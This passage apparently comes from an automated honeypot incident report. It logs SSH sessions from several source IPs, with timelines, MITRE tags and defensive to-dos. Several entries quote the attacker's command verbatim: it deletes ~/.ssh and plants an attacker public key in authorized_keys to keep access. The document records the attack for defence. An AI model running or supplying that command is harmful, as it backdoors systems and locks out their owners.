| `2026-06-06 15:42:16` | `cowrie.log.closed` |
| `2026-06-06 15:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e529277330

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:42 |
| **Last Seen** | 2026-06-06 15:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:42:18` | `cowrie.session.connect` |
| `2026-06-06 15:42:18` | `cowrie.client.version` |
| `2026-06-06 15:42:18` | `cowrie.client.kex` |
| `2026-06-06 15:42:19` | `cowrie.login.success` |
| `2026-06-06 15:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c175d86ed4a

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:43 |
| **Last Seen** | 2026-06-06 15:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:43:01` | `cowrie.session.connect` |
| `2026-06-06 15:43:01` | `cowrie.client.version` |
| `2026-06-06 15:43:01` | `cowrie.client.kex` |
| `2026-06-06 15:43:02` | `cowrie.login.success` |
| `2026-06-06 15:43:02` | `cowrie.session.params` |
| `2026-06-06 15:43:02` | `cowrie.command.input` |
| `2026-06-06 15:43:02` | `cowrie.command.failed` |
| `2026-06-06 15:43:02` | `cowrie.log.closed` |
| `2026-06-06 15:43:03` | `cowrie.session.params` |
| `2026-06-06 15:43:03` | `cowrie.command.input` |
| `2026-06-06 15:43:03` | `cowrie.session.file_download` |
| `2026-06-06 15:43:03` | `cowrie.log.closed` |
| `2026-06-06 15:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4ddc935cc31

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:43 |
| **Last Seen** | 2026-06-06 15:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:43:05` | `cowrie.session.connect` |
| `2026-06-06 15:43:05` | `cowrie.client.version` |
| `2026-06-06 15:43:05` | `cowrie.client.kex` |
| `2026-06-06 15:43:06` | `cowrie.login.success` |
| `2026-06-06 15:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0615d33b27fd

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:47 |
| **Last Seen** | 2026-06-06 15:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:47:18` | `cowrie.session.connect` |
| `2026-06-06 15:47:18` | `cowrie.client.version` |
| `2026-06-06 15:47:18` | `cowrie.client.kex` |
| `2026-06-06 15:47:19` | `cowrie.login.success` |
| `2026-06-06 15:47:19` | `cowrie.session.params` |
| `2026-06-06 15:47:19` | `cowrie.command.input` |
| `2026-06-06 15:47:19` | `cowrie.command.failed` |
| `2026-06-06 15:47:20` | `cowrie.log.closed` |
| `2026-06-06 15:47:20` | `cowrie.session.params` |
| `2026-06-06 15:47:20` | `cowrie.command.input` |
| `2026-06-06 15:47:20` | `cowrie.session.file_download` |
| `2026-06-06 15:47:20` | `cowrie.log.closed` |
| `2026-06-06 15:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd4018d1e7ce

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:47 |
| **Last Seen** | 2026-06-06 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:47:22` | `cowrie.session.connect` |
| `2026-06-06 15:47:22` | `cowrie.client.version` |
| `2026-06-06 15:47:22` | `cowrie.client.kex` |
| `2026-06-06 15:47:23` | `cowrie.login.success` |
| `2026-06-06 15:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb095c60f53e

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:48 |
| **Last Seen** | 2026-06-06 15:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:48:39` | `cowrie.session.connect` |
| `2026-06-06 15:48:39` | `cowrie.client.version` |
| `2026-06-06 15:48:39` | `cowrie.client.kex` |
| `2026-06-06 15:48:39` | `cowrie.login.success` |
| `2026-06-06 15:48:40` | `cowrie.session.params` |
| `2026-06-06 15:48:40` | `cowrie.command.input` |
| `2026-06-06 15:48:40` | `cowrie.command.failed` |
| `2026-06-06 15:48:40` | `cowrie.log.closed` |
| `2026-06-06 15:48:40` | `cowrie.session.params` |
| `2026-06-06 15:48:40` | `cowrie.command.input` |
| `2026-06-06 15:48:40` | `cowrie.session.file_download` |
| `2026-06-06 15:48:40` | `cowrie.log.closed` |
| `2026-06-06 15:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41bb09626c11

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:48 |
| **Last Seen** | 2026-06-06 15:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:48:42` | `cowrie.session.connect` |
| `2026-06-06 15:48:42` | `cowrie.client.version` |
| `2026-06-06 15:48:42` | `cowrie.client.kex` |
| `2026-06-06 15:48:43` | `cowrie.login.success` |
| `2026-06-06 15:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c30b84be46f

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:49 |
| **Last Seen** | 2026-06-06 15:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:49:28` | `cowrie.session.connect` |
| `2026-06-06 15:49:28` | `cowrie.client.version` |
| `2026-06-06 15:49:28` | `cowrie.client.kex` |
| `2026-06-06 15:49:29` | `cowrie.login.success` |
| `2026-06-06 15:49:29` | `cowrie.session.params` |
| `2026-06-06 15:49:29` | `cowrie.command.input` |
| `2026-06-06 15:49:29` | `cowrie.command.failed` |
| `2026-06-06 15:49:30` | `cowrie.log.closed` |
| `2026-06-06 15:49:30` | `cowrie.session.params` |
| `2026-06-06 15:49:30` | `cowrie.command.input` |
| `2026-06-06 15:49:30` | `cowrie.session.file_download` |
| `2026-06-06 15:49:30` | `cowrie.log.closed` |
| `2026-06-06 15:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c64e7aa6715b

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:49 |
| **Last Seen** | 2026-06-06 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:49:32` | `cowrie.session.connect` |
| `2026-06-06 15:49:32` | `cowrie.client.version` |
| `2026-06-06 15:49:32` | `cowrie.client.kex` |
| `2026-06-06 15:49:33` | `cowrie.login.success` |
| `2026-06-06 15:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3864583b7998

| Field | Detail |
|---|---|
| **Source IP** | `152.32.187[.]177` |
| **First Seen** | 2026-06-06 15:49 |
| **Last Seen** | 2026-06-06 15:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:49:39` | `cowrie.session.connect` |
| `2026-06-06 15:49:39` | `cowrie.client.version` |
| `2026-06-06 15:49:39` | `cowrie.client.kex` |
| `2026-06-06 15:49:39` | `cowrie.login.success` |
| `2026-06-06 15:49:40` | `cowrie.session.params` |
| `2026-06-06 15:49:40` | `cowrie.command.input` |
| `2026-06-06 15:49:40` | `cowrie.command.failed` |
| `2026-06-06 15:49:40` | `cowrie.log.closed` |
| `2026-06-06 15:49:40` | `cowrie.session.params` |
| `2026-06-06 15:49:40` | `cowrie.command.input` |
| `2026-06-06 15:49:40` | `cowrie.session.file_download` |
| `2026-06-06 15:49:40` | `cowrie.log.closed` |
| `2026-06-06 15:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.187[.]177` to AbuseIPDB if not already reported
- [ ] Block `152.32.187[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6910c632e8d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.187[.]177` |
| **First Seen** | 2026-06-06 15:49 |
| **Last Seen** | 2026-06-06 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:49:42` | `cowrie.session.connect` |
| `2026-06-06 15:49:42` | `cowrie.client.version` |
| `2026-06-06 15:49:42` | `cowrie.client.kex` |
| `2026-06-06 15:49:42` | `cowrie.login.success` |
| `2026-06-06 15:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.187[.]177` to AbuseIPDB if not already reported
- [ ] Block `152.32.187[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceca552aab2c

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:50 |
| **Last Seen** | 2026-06-06 15:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:50:46` | `cowrie.session.connect` |
| `2026-06-06 15:50:46` | `cowrie.client.version` |
| `2026-06-06 15:50:46` | `cowrie.client.kex` |
| `2026-06-06 15:50:46` | `cowrie.login.success` |
| `2026-06-06 15:50:46` | `cowrie.session.params` |
| `2026-06-06 15:50:46` | `cowrie.command.input` |
| `2026-06-06 15:50:46` | `cowrie.command.failed` |
| `2026-06-06 15:50:47` | `cowrie.log.closed` |
| `2026-06-06 15:50:47` | `cowrie.session.params` |
| `2026-06-06 15:50:47` | `cowrie.command.input` |
| `2026-06-06 15:50:47` | `cowrie.session.file_download` |
| `2026-06-06 15:50:47` | `cowrie.log.closed` |
| `2026-06-06 15:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e525221645

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 15:50 |
| **Last Seen** | 2026-06-06 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:50:49` | `cowrie.session.connect` |
| `2026-06-06 15:50:49` | `cowrie.client.version` |
| `2026-06-06 15:50:49` | `cowrie.client.kex` |
| `2026-06-06 15:50:49` | `cowrie.login.success` |
| `2026-06-06 15:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3c19388c937

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:51 |
| **Last Seen** | 2026-06-06 15:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:51:39` | `cowrie.session.connect` |
| `2026-06-06 15:51:39` | `cowrie.client.version` |
| `2026-06-06 15:51:39` | `cowrie.client.kex` |
| `2026-06-06 15:51:40` | `cowrie.login.success` |
| `2026-06-06 15:51:40` | `cowrie.session.params` |
| `2026-06-06 15:51:40` | `cowrie.command.input` |
| `2026-06-06 15:51:40` | `cowrie.command.failed` |
| `2026-06-06 15:51:41` | `cowrie.log.closed` |
| `2026-06-06 15:51:41` | `cowrie.session.params` |
| `2026-06-06 15:51:41` | `cowrie.command.input` |
| `2026-06-06 15:51:41` | `cowrie.session.file_download` |
| `2026-06-06 15:51:41` | `cowrie.log.closed` |
| `2026-06-06 15:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e45a7a37b7dd

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:51 |
| **Last Seen** | 2026-06-06 15:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:51:43` | `cowrie.session.connect` |
| `2026-06-06 15:51:43` | `cowrie.client.version` |
| `2026-06-06 15:51:43` | `cowrie.client.kex` |
| `2026-06-06 15:51:44` | `cowrie.login.success` |
| `2026-06-06 15:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99c71be6aba

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:53 |
| **Last Seen** | 2026-06-06 15:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:53:46` | `cowrie.session.connect` |
| `2026-06-06 15:53:46` | `cowrie.client.version` |
| `2026-06-06 15:53:46` | `cowrie.client.kex` |
| `2026-06-06 15:53:47` | `cowrie.login.success` |
| `2026-06-06 15:53:47` | `cowrie.session.params` |
| `2026-06-06 15:53:47` | `cowrie.command.input` |
| `2026-06-06 15:53:47` | `cowrie.command.failed` |
| `2026-06-06 15:53:47` | `cowrie.log.closed` |
| `2026-06-06 15:53:48` | `cowrie.session.params` |
| `2026-06-06 15:53:48` | `cowrie.command.input` |
| `2026-06-06 15:53:48` | `cowrie.session.file_download` |
| `2026-06-06 15:53:48` | `cowrie.log.closed` |
| `2026-06-06 15:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e4f8314e58d

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:53 |
| **Last Seen** | 2026-06-06 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 15:53:50` | `cowrie.session.connect` |
| `2026-06-06 15:53:50` | `cowrie.client.version` |
| `2026-06-06 15:53:50` | `cowrie.client.kex` |
| `2026-06-06 15:53:51` | `cowrie.login.success` |
| `2026-06-06 15:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ea18f377ade

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 15:55 |
| **Last Seen** | 2026-06-06 15:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
